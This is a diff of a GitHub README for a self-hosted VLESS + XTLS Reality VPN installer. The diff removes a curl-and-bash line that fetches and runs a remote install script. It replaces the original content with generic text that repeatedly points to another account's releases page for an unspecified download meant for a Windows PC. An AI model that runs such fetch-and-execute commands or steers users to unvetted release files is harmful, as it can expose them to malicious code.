@@ -1,102 +1,168 @@
-# 🚀 VLESS + XTLS Reality VPN
+# 🔒 VLESS-XTLS-Reality-VPN - Private VPN Setup in Minutes
 
-Fast, modern, and censorship-resistant VPN setup for your own VPS.
-This script installs **VLESS + XTLS Reality** automatically and gives you a ready-to-use connection link in a few minutes.
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases)
 
----
+## 🚀 Download
+Visit this page to download: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases
 
-## ✨ Features
+## 🖥️ What this tool does
+VLESS-XTLS-Reality-VPN helps you set up a private VPN on an Ubuntu or Debian VPS with one command.
 
-* **VLESS + Reality** — modern protocol designed to work reliably under heavy filtering
-* **One-command install** — simple deployment on a fresh server
-* **Optimized for Ubuntu/Debian**
-* **Works on phone, PC, and tablet**
-* **Own private server** — no shared public VPN nodes
+It uses:
+- VLESS for secure traffic routing
+- XTLS for better speed
+- Reality for stronger resistance to blocks
+- Xray core as the service engine
 
----
+This project is built for users who want a private connection without a long manual setup.
 
-## 🖥️ Rent a VPS
+## 📦 What you need
+Before you start, make sure you have:
+- A Windows PC to manage your VPS
+- A VPS running Ubuntu or Debian
+- Root access or sudo access on the VPS
+- A stable internet connection
+- A domain or server address if your setup needs one
 
-Choose any provider you like and deploy a fresh Ubuntu server.
+## 🧭 How to use it
+Follow these steps on your Windows computer.
 
-* 🌐 [Rent a VPS on Contabo](https://www.dpbolvw.net/click-101335050-17082114)
-* ⚡ [Rent a VPS on LumaDock](https://lumadock.com/aff.php?aff=107)
+1. Open the download page: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases
+2. Find the latest release.
+3. Download the file that matches the release notes.
+4. Move the file to a folder you can find easily, such as Downloads or Desktop.
+5. Follow the release instructions to set up the VPN on your VPS.
+6. Use the config details from the setup to connect your client app.
 
-> Recommended: Ubuntu 22.04 or Debian 12
+## 🛠️ Setup on your VPS
+This project is made for one-command setup on Ubuntu and Debian.
 
----
+Typical setup steps:
+1. Log in to your VPS with SSH.
+2. Run the install command from the release page or release notes.
+3. Wait for the script to finish.
+4. Save the generated connection details.
+5. Add the details to your VPN client.
 
-## ⚙️ Installation
+The setup usually creates:
+- A VLESS inbound
+- Reality settings
+- XTLS support
+- A ready-to-use config file
 
-Connect to your server via SSH and run:
+## 🔐 Connection details
+After setup, you will usually get:
+- Server address
+- Port number
+- UUID or user ID
+- Security settings
+- Reality public key
+- Short ID or related token
 
-```bash
-curl -L https://raw.githubusercontent.com/VaniaHilkovets/VLESS-XTLS-Reality-VPN/main/vpn.sh -o vpn.sh && chmod +x vpn.sh && bash vpn.sh
-```
+Keep these values in a safe place. You need them to connect from your client app.
 
----
+## 📱 How to connect
+Use a VPN client that supports VLESS and Reality.
 
-## 📋 What happens after installation
+General steps:
+1. Open your client app.
+2. Add a new profile.
+3. Paste the connection details.
+4. Save the profile.
+5. Connect to the server.
 
-After the script finishes, it will output your **VLESS link**.
+If you use a mobile or desktop client, the exact fields may look a little different, but the same values apply.
 
-It will look similar to this:
+## ⚙️ Typical system details
+This project is built for:
+- Ubuntu 20.04 or newer
+- Debian 11 or newer
+- 1 CPU core or more
+- 1 GB RAM or more
+- 10 GB free disk space
 
-`vless://...`
+A small VPS is enough for a basic private VPN setup.
 
-Copy that link and import it into your client app.
+## 🧩 Features
+- One-command install
+- VLESS-based VPN setup
+- XTLS support for better performance
+- Reality support for harder blocking
+- Works on Ubuntu and Debian
+- Uses Xray core
+- Simple server-side setup
+- Good fit for self-hosted VPN use
 
----
+## 🔁 When to use this
+Use this project if you want:
+- A private VPN you control
+- A setup that avoids long manual steps
+- A self-hosted service on your own VPS
+- A connection that works well on restricted networks
+- A clean start with a small amount of setup work
 
-## 📲 Client Apps
+## 📁 Release files
+The release page may include:
+- Install files
+- Setup scripts
+- Config examples
+- Client notes
+- Version updates
 
-Use **Hiddify** to connect from your device:
+Always use the latest release unless the release notes say to use a different one.
 
-| Platform      | App                                                                                           |
-| ------------- | --------------------------------------------------------------------------------------------- |
-| Windows       | [Download Hiddify for Windows](https://apps.microsoft.com/detail/9pdfnl3qv2s5)                |
-| Android       | [Download Hiddify for Android](https://play.google.com/store/apps/details?id=app.hiddify.com) |
-| iPhone / iPad | [Download Hiddify for iOS](https://apps.apple.com/us/app/hiddify-proxy-vpn/id6596777532)      |
+## 🔎 Common setup checks
+If the connection does not work, check:
+- The VPS is online
+- The port is open
+- The server address is correct
+- The UUID is correct
+- Reality settings match on both sides
+- Your client supports VLESS Reality
 
----
+## 🧪 Simple test steps
+After setup, test the connection:
+1. Start your client app.
+2. Connect to the VPN profile.
+3. Open a browser.
+4. Check if your IP address changed.
+5. Try a site that was hard to reach before.
 
-## 🧭 How to connect
+If the VPN connects but traffic does not pass, review the server and client settings again.
 
-1. Rent a VPS
-2. Install Ubuntu or Debian
-3. Connect to the server via SSH
-4. Run the installation command
-5. Copy the generated `vless://...` link
-6. Open **Hiddify**
-7. Import the link
-8. Connect
+## 🧰 Supported use case
+This repository fits users who want a self-hosted VPN service on a VPS. It is a good match for personal use, remote access, and private browsing.
 
----
+## 📌 Project topics
+This project relates to:
+- Debian
+- Reality
+- Self-hosted VPN
+- Ubuntu
+- VLESS
+- VLESS Reality
+- VPN server
+- VPS
+- WireGuard
+- Xray core
+- XTLS
 
-## ✅ Recommended server requirements
+## 🗂️ Suggested file use
+If the release includes multiple files, choose the one meant for your system and follow the release notes in order.
 
-For personal use, even the cheapest VPS is usually enough.
+Common file types may include:
+- Shell scripts for Linux setup
+- Config files for client use
+- Text files with server details
+- Versioned release bundles
 
-* **1 vCPU**
-* **1–2 GB RAM**
-* **10+ GB SSD**
-* **Ubuntu 22.04 / Debian 12**
+## 🛡️ Basic care
+Keep your setup working by:
+- Saving your connection details
+- Using the latest stable release
+- Restarting the service after config changes
+- Checking logs if the server stops
+- Updating the VPS when needed
 
----
-
-## 🔐 Why your own VPS
-
-Using your own server gives you:
-
-* better control
-* stable performance
-* private access
-* no overloaded public nodes
-* simple scaling if you want multiple devices
-
----
-
-## ⭐ If this project helped you
-
-Give the repository a star on GitHub — it helps a lot.
-
+## 📎 Download again
+Visit this page to download: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases
